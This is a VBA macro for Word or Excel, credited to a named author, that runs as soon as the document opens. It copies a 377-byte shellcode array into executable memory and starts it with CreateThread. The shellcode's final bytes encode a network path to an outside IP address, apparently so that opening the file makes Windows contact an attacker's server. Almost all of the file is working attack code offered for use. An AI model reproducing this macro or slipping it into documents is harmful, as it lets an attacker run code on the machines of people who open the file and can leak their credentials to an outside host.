' Author : Osanda Malith Jayathissa (@OsandaMalith)
' Title: Shellcode to request a non-existing network path
' Websie: https://osandamalith
' This is word/excel macro. This can be used in vb6 applications as well

#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
		ByVal lpThreadAttributes As Long, _
		ByVal dwStackSize As Long, _ 
		ByVal lpStartAddress As LongPtr, _
		lpParameter As Long, _
		ByVal dwCreationFlags As Long, _ 
		lpThreadId As Long) As LongPtr


	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
		ByVal lpAddress As Long, _
		ByVal dwSize As Long, _
		ByVal flAllocationType As Long, _
		ByVal flProtect As Long) As LongPtr 

	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
		ByVal Destination  As LongPtr, _
		ByRef Source As Any, _
		ByVal Length As Long) As LongPtr

#Else
	Private Declare Function CreateThread Lib "kernel32" ( _
		ByVal lpThreadAttributes As Long, _
		ByVal dwStackSize As Long, _
		ByVal lpStartAddress As Long, _
		lpParameter As Long, _
		ByVal dwCreationFlags As Long, _
		lpThreadId As Long) As Long

	Private Declare Function VirtualAlloc Lib "kernel32" ( _
		ByVal lpAddress As Long, _
		ByVal dwSize As Long, _
		ByVal flAllocationType As Long, _
		ByVal flProtect As Long) As Long

	Private Declare Function RtlMoveMemory Lib "kernel32" ( _
		ByVal Destination As Long, _
		ByRef Source As Any, _
		ByVal Length As Long) As Long
#EndIf

Const MEM_COMMIT = &H1000
Const PAGE_EXECUTE_READWRITE = &H40

Sub Auto_Open()
	Dim source As Long, i As Long
#If Vba7 Then
	Dim  lpMemory As LongPtr, lResult As LongPtr
#Else
	Dim  lpMemory As Long, lResult As Long
#EndIf

Dim bShellcode(376) As Byte
bShellcode(0) = 232
bShellcode(1) = 255
bShellcode(2) = 255
bShellcode(3) = 255
bShellcode(4) = 255
bShellcode(5) = 192
bShellcode(6) = 95
bShellcode(7) = 185
bShellcode(8) = 85
bShellcode(9) = 3
bShellcode(10) = 2
bShellcode(11) = 2
bShellcode(12) = 129
bShellcode(13) = 241
bShellcode(14) = 2
bShellcode(15) = 2
bShellcode(16) = 2
bShellcode(17) = 2
bShellcode(18) = 131
bShellcode(19) = 199
bShellcode(20) = 29
bShellcode(21) = 51
bShellcode(22) = 246
bShellcode(23) = 252
bShellcode(24) = 138
bShellcode(25) = 7
bShellcode(26) = 60
bShellcode(27) = 5
bShellcode(28) = 15
bShellcode(29) = 68
bShellcode(30) = 198
bShellcode(31) = 170
bShellcode(32) = 226
bShellcode(33) = 246
bShellcode(34) = 232
bShellcode(35) = 5
bShellcode(36) = 5
bShellcode(37) = 5
bShellcode(38) = 5
bShellcode(39) = 94
bShellcode(40) = 139
bShellcode(41) = 254
bShellcode(42) = 129
bShellcode(43) = 198
bShellcode(44) = 41
bShellcode(45) = 1
bShellcode(46) = 5
bShellcode(47) = 5
bShellcode(48) = 185
bShellcode(49) = 2
bShellcode(50) = 5
bShellcode(51) = 5
bShellcode(52) = 5
bShellcode(53) = 252
bShellcode(54) = 173
bShellcode(55) = 1
bShellcode(56) = 60
bShellcode(57) = 7
bShellcode(58) = 226
bShellcode(59) = 250
bShellcode(60) = 86
bShellcode(61) = 185
bShellcode(62) = 141
bShellcode(63) = 16
bShellcode(64) = 183
bShellcode(65) = 248
bShellcode(66) = 232
bShellcode(67) = 95
bShellcode(68) = 5
bShellcode(69) = 5
bShellcode(70) = 5
bShellcode(71) = 104
bShellcode(72) = 49
bShellcode(73) = 1
bShellcode(74) = 5
bShellcode(75) = 5
bShellcode(76) = 255
bShellcode(77) = 208
bShellcode(78) = 185
bShellcode(79) = 224
bShellcode(80) = 83
bShellcode(81) = 49
bShellcode(82) = 75
bShellcode(83) = 232
bShellcode(84) = 78
bShellcode(85) = 5
bShellcode(86) = 5
bShellcode(87) = 5
bShellcode(88) = 185
bShellcode(89) = 172
bShellcode(90) = 213
bShellcode(91) = 170
bShellcode(92) = 136
bShellcode(93) = 139
bShellcode(94) = 240
bShellcode(95) = 232
bShellcode(96) = 66
bShellcode(97) = 5
bShellcode(98) = 5
bShellcode(99) = 5
bShellcode(100) = 106
bShellcode(101) = 5
bShellcode(102) = 104
bShellcode(103) = 128
bShellcode(104) = 5
bShellcode(105) = 5
bShellcode(106) = 5
bShellcode(107) = 106
bShellcode(108) = 3
bShellcode(109) = 106
bShellcode(110) = 5
bShellcode(111) = 106
bShellcode(112) = 1
bShellcode(113) = 104
bShellcode(114) = 5
bShellcode(115) = 5
bShellcode(116) = 5
bShellcode(117) = 128
bShellcode(118) = 104
bShellcode(119) = 62
bShellcode(120) = 1
bShellcode(121) = 5
bShellcode(122) = 5
bShellcode(123) = 255
bShellcode(124) = 208
bShellcode(125) = 106
bShellcode(126) = 5
bShellcode(127) = 255
bShellcode(128) = 214
bShellcode(129) = 51
bShellcode(130) = 192
bShellcode(131) = 94
bShellcode(132) = 195
bShellcode(133) = 51
bShellcode(134) = 210
bShellcode(135) = 235
bShellcode(136) = 16
bShellcode(137) = 193
bShellcode(138) = 202
bShellcode(139) = 13
bShellcode(140) = 60
bShellcode(141) = 97
bShellcode(142) = 15
bShellcode(143) = 190
bShellcode(144) = 192
bShellcode(145) = 124
bShellcode(146) = 3
bShellcode(147) = 131
bShellcode(148) = 232
bShellcode(149) = 32
bShellcode(150) = 3
bShellcode(151) = 208
bShellcode(152) = 65
bShellcode(153) = 138
bShellcode(154) = 1
bShellcode(155) = 132
bShellcode(156) = 192
bShellcode(157) = 117
bShellcode(158) = 234
bShellcode(159) = 139
bShellcode(160) = 194
bShellcode(161) = 195
bShellcode(162) = 141
bShellcode(163) = 65
bShellcode(164) = 248
bShellcode(165) = 195
bShellcode(166) = 85
bShellcode(167) = 139
bShellcode(168) = 236
bShellcode(169) = 131
bShellcode(170) = 236
bShellcode(171) = 20
bShellcode(172) = 83
bShellcode(173) = 86
bShellcode(174) = 87
bShellcode(175) = 137
bShellcode(176) = 77
bShellcode(177) = 244
bShellcode(178) = 100
bShellcode(179) = 161
bShellcode(180) = 48
bShellcode(181) = 5
bShellcode(182) = 5
bShellcode(183) = 5
bShellcode(184) = 137
bShellcode(185) = 69
bShellcode(186) = 252
bShellcode(187) = 139
bShellcode(188) = 69
bShellcode(189) = 252
bShellcode(190) = 139
bShellcode(191) = 64
bShellcode(192) = 12
bShellcode(193) = 139
bShellcode(194) = 64
bShellcode(195) = 20
bShellcode(196) = 137
bShellcode(197) = 69
bShellcode(198) = 236
bShellcode(199) = 139
bShellcode(200) = 248
bShellcode(201) = 139
bShellcode(202) = 207
bShellcode(203) = 232
bShellcode(204) = 210
bShellcode(205) = 255
bShellcode(206) = 255
bShellcode(207) = 255
bShellcode(208) = 139
bShellcode(209) = 112
bShellcode(210) = 24
bShellcode(211) = 139
bShellcode(212) = 63
bShellcode(213) = 133
bShellcode(214) = 246
bShellcode(215) = 116
bShellcode(216) = 79
bShellcode(217) = 139
bShellcode(218) = 70
bShellcode(219) = 60
bShellcode(220) = 139
bShellcode(221) = 92
bShellcode(222) = 48
bShellcode(223) = 120
bShellcode(224) = 133
bShellcode(225) = 219
bShellcode(226) = 116
bShellcode(227) = 68
bShellcode(228) = 139
bShellcode(229) = 76
bShellcode(230) = 51
bShellcode(231) = 12
bShellcode(232) = 3
bShellcode(233) = 206
bShellcode(234) = 232
bShellcode(235) = 150
bShellcode(236) = 255
bShellcode(237) = 255
bShellcode(238) = 255
bShellcode(239) = 139
bShellcode(240) = 76
bShellcode(241) = 51
bShellcode(242) = 32
bShellcode(243) = 137
bShellcode(244) = 69
bShellcode(245) = 248
bShellcode(246) = 51
bShellcode(247) = 192
bShellcode(248) = 3
bShellcode(249) = 206
bShellcode(250) = 137
bShellcode(251) = 77
bShellcode(252) = 240
bShellcode(253) = 137
bShellcode(254) = 69
bShellcode(255) = 252
bShellcode(256) = 57
bShellcode(257) = 68
bShellcode(258) = 51
bShellcode(259) = 24
bShellcode(260) = 118
bShellcode(261) = 34
bShellcode(262) = 139
bShellcode(263) = 12
bShellcode(264) = 129
bShellcode(265) = 3
bShellcode(266) = 206
bShellcode(267) = 232
bShellcode(268) = 117
bShellcode(269) = 255
bShellcode(270) = 255
bShellcode(271) = 255
bShellcode(272) = 3
bShellcode(273) = 69
bShellcode(274) = 248
bShellcode(275) = 57
bShellcode(276) = 69
bShellcode(277) = 244
bShellcode(278) = 116
bShellcode(279) = 28
bShellcode(280) = 139
bShellcode(281) = 69
bShellcode(282) = 252
bShellcode(283) = 139
bShellcode(284) = 77
bShellcode(285) = 240
bShellcode(286) = 64
bShellcode(287) = 137
bShellcode(288) = 69
bShellcode(289) = 252
bShellcode(290) = 59
bShellcode(291) = 68
bShellcode(292) = 51
bShellcode(293) = 24
bShellcode(294) = 114
bShellcode(295) = 222
bShellcode(296) = 59
bShellcode(297) = 125
bShellcode(298) = 236
bShellcode(299) = 117
bShellcode(300) = 156
bShellcode(301) = 51
bShellcode(302) = 192
bShellcode(303) = 95
bShellcode(304) = 94
bShellcode(305) = 91
bShellcode(306) = 201
bShellcode(307) = 195
bShellcode(308) = 139
bShellcode(309) = 77
bShellcode(310) = 252
bShellcode(311) = 139
bShellcode(312) = 68
bShellcode(313) = 51
bShellcode(314) = 36
bShellcode(315) = 141
bShellcode(316) = 4
bShellcode(317) = 72
bShellcode(318) = 15
bShellcode(319) = 183
bShellcode(320) = 12
bShellcode(321) = 48
bShellcode(322) = 139
bShellcode(323) = 68
bShellcode(324) = 51
bShellcode(325) = 28
bShellcode(326) = 141
bShellcode(327) = 4
bShellcode(328) = 136
bShellcode(329) = 139
bShellcode(330) = 4
bShellcode(331) = 48
bShellcode(332) = 3
bShellcode(333) = 198
bShellcode(334) = 235
bShellcode(335) = 223
bShellcode(336) = 33
bShellcode(337) = 5
bShellcode(338) = 5
bShellcode(339) = 5
bShellcode(340) = 80
bShellcode(341) = 5
bShellcode(342) = 5
bShellcode(343) = 5
bShellcode(344) = 107
bShellcode(345) = 101
bShellcode(346) = 114
bShellcode(347) = 110
bShellcode(348) = 101
bShellcode(349) = 108
bShellcode(350) = 51
bShellcode(351) = 50
bShellcode(352) = 46
bShellcode(353) = 100
bShellcode(354) = 108
bShellcode(355) = 108
bShellcode(356) = 5
bShellcode(357) = 47
bShellcode(358) = 47
bShellcode(359) = 51
bShellcode(360) = 53
bShellcode(361) = 46
bShellcode(362) = 49
bShellcode(363) = 54
bShellcode(364) = 52
bShellcode(365) = 46
bShellcode(366) = 49
bShellcode(367) = 53
bShellcode(368) = 51
bShellcode(369) = 46
bShellcode(370) = 50
bShellcode(371) = 50
bShellcode(372) = 52
bShellcode(373) = 47
bShellcode(374) = 97
bShellcode(375) = 97
bShellcode(376) = 5

	lpMemory = VirtualAlloc(0, UBound(bShellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	For i = LBound(bShellcode) To UBound(bShellcode)
		source = bShellcode(i)
		lResult = RtlMoveMemory(lpMemory + i, source, 1)
	Next i
	lResult = CreateThread(0, 0, lpMemory, 0, 0, 0)
End Sub
Sub AutoOpen()
	Auto_Open
End Sub
Sub Workbook_Open()
	Auto_Open
End Sub
